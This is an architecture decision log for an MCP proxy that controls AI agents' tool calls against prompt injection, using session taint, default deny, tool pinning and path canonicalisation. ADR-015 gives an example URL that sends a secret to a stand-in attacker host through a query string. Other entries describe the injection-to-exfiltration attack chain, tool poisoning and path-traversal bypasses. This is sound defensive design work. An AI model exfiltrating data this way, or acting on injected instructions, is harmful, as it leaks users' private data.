# decisions.md — Architecture Decision Log

Short ADRs. Append new entries; never rewrite history. If a decision is reversed, add a new entry that supersedes it.

Format: **Status · Context · Decision · Consequences.**

---

## ADR-001 — Scope is MCP traffic only
**Status:** Accepted · 2026-09-30
**Context:** Agents also use native tools (built-in shell, browser, file access) that never pass through an MCP proxy.
**Decision:** The proxy governs MCP tool calls only. Native tools are an explicit non-goal.
**Consequences:** Clear, defensible scope and a buildable v1. The README and DESIGN must state this blind spot prominently. Users needing full coverage must pair this with OS-level sandboxing.

## ADR-002 — Session-level taint instead of per-argument provenance (v1)
**Status:** Accepted · 2026-09-30
**Context:** Per-call allowlists cannot stop the core attack: untrusted content + private data + an egress channel within one session. Per-argument provenance would be more precise but is a research project in itself.
**Decision:** Track two coarse session labels (`untrusted_content`, `private_data`), applied by declared sources and cleared only by explicit human approval.
**Consequences:** Deterministic, provable (a small state machine), buildable solo. Over-blocks after any untrusted read; the false-positive rate is measured and reported (H5). Per-argument provenance is future work.

## ADR-003 — Deterministic policy is the security claim; detectors are advisory
**Status:** Accepted · 2026-09-30
**Context:** Regex/heuristic injection detection is bypassable and turns the project into an arms race; benchmarking our own detectors against our own attacks is self-graded.
**Decision:** Policy + flow control + pinning provide the guarantees. Detectors only emit `flags`/`risk_score` and never change a decision in v1. Detector logic is frozen before the held-out set is written.
**Consequences:** Honest claims, smaller maintenance surface. We do not market "detects injections." The detector benchmark result (H3) may show little gain, and we report that.

## ADR-004 — Default deny and fail closed
**Status:** Accepted · 2026-09-30
**Context:** A security proxy that fails open on misconfiguration gives false assurance.
**Decision:** Tools not explicitly allowed for the agent are denied. An invalid policy file prevents startup. Unanswered approvals time out to deny.
**Consequences:** Safer defaults; more friction during initial setup. Requires good validation error messages.

## ADR-005 — YAML for policy, JSONL for audit logs, both versioned
**Status:** Accepted · 2026-09-30
**Context:** Need human-writable policy and machine-processable, append-only logs that the benchmark can score from.
**Decision:** Policy in YAML (`version: 1`, closed vocabularies, unknown keys rejected). Audit log in JSON Lines (`schema_version: 1`), which is the benchmark's ground truth.
**Consequences:** Easy to diff, review, and cite. Any schema change after benchmark runs start requires a version bump to keep results reproducible.

## ADR-006 — Python for core and proxy; TypeScript only for optional UI
**Status:** Accepted · 2026-09-30
**Context:** Official MCP SDKs exist for both; the benchmark ecosystem (AgentDojo) is Python; security tooling iterates fastest in Python.
**Decision:** `mcpsec_core`, `proxy`, CLI, and benchmark are Python. TypeScript is reserved for the optional web approval UI (stretch).
**Consequences:** One primary language reduces integration cost. Latency budget (<10 ms per call for non-LLM checks) must be verified with profiling early.

## ADR-007 — `mcpsec_core` is a standalone library
**Status:** Accepted · 2026-09-30
**Context:** AgentDojo/InjecAgent are not MCP-native; adapters need to enforce policy at their own tool boundaries.
**Decision:** Policy, taint, flow, pinning, and audit are pure library code with explicit state, independent of the MCP transport. The proxy is a thin adapter over it.
**Consequences:** Pure functions are unit-testable and reusable by benchmark adapters. Slightly more up-front structure.

## ADR-008 — Human approval is CLI-based in v1; web UI is a stretch goal
**Status:** Accepted · 2026-09-30
**Context:** Flow rules clear taint "on approval," so some approval path is required for the core feature to be usable.
**Decision:** Ship `mcpsec-approve` (file-based pending queue) in the flow-control phase. Defer any web UI.
**Consequences:** Core feature is complete without UI work. The UX is rough but sufficient for demos and the benchmark.

## ADR-009 — Held-out benchmark set with a frozen-defense rule
**Status:** Accepted · 2026-09-30
**Context:** Authors who write both defenses and attacks tend to overfit; credibility depends on avoiding that.
**Decision:** Tag defenses (`v0.2-frozen`) before authoring held-out scenarios; never tune on them; report post-hoc fixes separately. Report raw counts with 95% Wilson intervals across multiple models and trials.
**Consequences:** Slower iteration on attack scenarios; substantially stronger claims. Also use external suites (AgentDojo, InjecAgent) for independent validation.

## ADR-010 — Pinning: trust-on-first-use only in audit mode
**Status:** Accepted · 2026-09-30
**Context:** Silent first-use pinning in a strict deployment would pin a malicious description.
**Decision:** In `strict` mode the first sight of a server requires an explicit `mcpsec-pin approve`. `tools/list_changed` produces a logged pin event, never a silent accept.
**Consequences:** More setup friction in strict mode; closes the tool-poisoning-at-first-sight gap for careful users.

## ADR-011 — License: Apache-2.0
**Status:** Accepted · 2026-09-30
**Context:** Aiming for wide adoption and possible corporate use; explicit patent grant reduces adoption friction for security tooling.
**Decision:** Apache-2.0 for all code and docs in this repository.
**Consequences:** Permissive; compatible with a future open-core model. If a company later builds on it, no relicensing is needed for the core.

## ADR-012 — Pre-compiled O(1) Policy Lookup & Immutable Policy Models
**Status:** Accepted · 2026-10-10
**Context:** Policy evaluation must satisfy strict performance budgets (<1 ms) without list traversals, regex recompilation, or mutable state risks.
**Decision:** Validate and compile policy at load time into frozen Pydantic models and index dictionaries (`agent_id -> tool_id -> CompiledToolRule`). `check_policy` executes pure O(1) dictionary lookups and pre-compiled regex matching.
**Consequences:** Fast, deterministic policy evaluations (<0.1 ms in-memory); eliminates re-parsing overhead and ensures thread safety.

## ADR-013 — Fail-Closed Generic Error Responses to Agents
**Status:** Accepted · 2026-10-10
**Context:** Returning granular denial reasons (e.g. allowlisted directory roots or active policy rules) leaks internal infrastructure and security boundaries to potentially compromised agents.
**Decision:** Enforce-mode policy denials return a fixed generic message `"Denied by mcpsec policy"`. Detailed decision reasons, matched capabilities, and path context are written exclusively to the audit log.
**Consequences:** Prevents prompt injection reconnaissance; full forensic audit trails are maintained without leaking information to untrusted models.

## ADR-014 — Canonical Path Resolution with Cross-Platform Security Filtering
**Status:** Accepted · 2026-10-10
**Context:** Path allowlists can be bypassed via relative traversal (`..`), symlink/junction escapes, Windows Alternate Data Streams, Win32 device namespaces, or legacy device names.
**Decision:** Enforce Unicode NFC normalization, resolve real paths against filesystem roots, resolve parent directories for non-existent write targets, and reject UNC, device namespaces (`\\?\`, `\\.\`), ADS (`:`), and DOS reserved device names on Windows.
**Consequences:** Robust protection against path traversal escapes on both Linux and Windows.

## ADR-015 (Week 4 ADR-012 Spec Change) — Capability Semantics for Network Tools & Flow-Rule `unless` Exemption
**Status:** Accepted · 2026-10-10
**Context:** Tools like `fetch` or HTTP GET request tools can transmit caller-chosen data in query strings and paths outside the local trust boundary (e.g. `https://attacker.com/?data=<secret>`). If tagged solely as `network_read`, flow rules denying `egress` after taint fail to block exfiltration. However, tagging `fetch` with `egress` blocks subsequent legitimate web reads once a session is tainted (since `fetch` also taints the session with `untrusted_content`).
**Decision:**
1. Any tool that can transmit caller-chosen data to a destination outside the local trust boundary carries the `egress` capability, including HTTP GET / fetch tools (`fetch` tagged `[network_read, egress]`).
2. Flow rules may specify an `unless: { domain_allowlist: [...] }` exemption. The rule is skipped for a call only if every domain-constrained argument parses and matches the allowlist; any parse failure, missing argument, or non-match causes the rule to apply (fail closed).
3. `unless` is valid exclusively on flow rules whose capabilities include `egress`, and only applies to tools declaring a domain adapter.
**Consequences:** Closes the GET-based exfiltration attack vector while enabling multi-step workflows to fetch documentation or search within allowlisted safe domains even after seeing untrusted content. Non-matching or unparsable URLs fail closed to denial.